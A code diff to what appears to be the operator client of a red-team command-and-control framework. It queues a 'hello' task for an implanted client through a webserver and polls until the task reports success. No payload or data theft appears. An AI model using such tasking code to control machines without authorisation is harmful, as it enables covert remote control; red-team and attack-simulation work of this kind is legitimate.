@@ -5,6 +5,8 @@
 ##
 ## Threat and Attack Simulation Team
 ##
+import sys
+import time
 import base64
 import argparse
 
@@ -61,8 +63,7 @@ if __name__ in '__main__':
     ##
     ## "hello"
     ##
-    if args.subcommand == 'hello':
-
+    else:
         ##
         ## Get the target
         ##
@@ -83,39 +84,55 @@ if __name__ in '__main__':
                     ##
                     ## Create the task.
                     ##
-                    logging.success( 'Sending task to the client' );
+                    logging.success( 'Dispatching a task to the webserver' );
 
                     ##
-                    ## Insert Task
+                    ## Insert Task: Hello
                     ##
-                    Tsk = Web.new_task( {
-                        'code': tasking.COMMAND_HELLO,
-                        'target_id': Client['id'],
-                        'args': { 'buffer': '{}'.format( base64.b64encode( b'' ).decode() ) }
-                    } );
+                    if args.subcommand == 'hello':
+                        ##
+                        ## Hello has no buffer
+                        ##
+                        Tsk = Web.new_task( {
+                            'code': tasking.COMMAND_HELLO,
+                            'target_id': Client['id'],
+                            'args': { 'buffer': '{}'.format( base64.b64encode( b'' ).decode() ) }
+                        } );
 
                     ##
                     ## Print Info
                     ##
-                    logging.debug( 'Requested task {} to be executed.'.format( str( Tsk['id'] ) ) );
+                    logging.success( 'Task has been added to the queue.' );
 
                     ##
                     ## Abort
                     ##
                     if args.block != False:
-                        ##
-                        ## Start riskin
-                        ##
                         while True:
-                            for Obj in Web.get_tasks():
+                            try:
                                 ##
-                                ## Does it match our dispatched task?
+                                ## Read the current task
                                 ##
-                                if Tsk['id'] == Obj['id'] and Tsk['target_id'] == Obj['target_id'] and Obj['status'] == 3:
+                                Obj = Web.get_task( str( Tsk['id'] ) )[0];
+
+                                ##
+                                ##
+                                ## Did it succeeed?
+                                if ( Obj['status'] == 3 ):
                                     ##
                                     ## Success!
                                     ##
-                                    print( 'task completed successfully.' );
+                                    logging.success( 'Task was executed sucessfully. Task returned {}'.format( Obj['return_code'] ) );
+                                    break;
+                                else:
+                                    ##
+                                    ## Nothing yet.
+                                    ##
+                                    time.sleep( 5 );
+                            except Exception as Error:
+                                logging.error( 'Error {}'.format( Error ) );
+                                raise SystemExit;
+
                     break;
         else:
             logging.error( 'please provide an id to interact with.' );
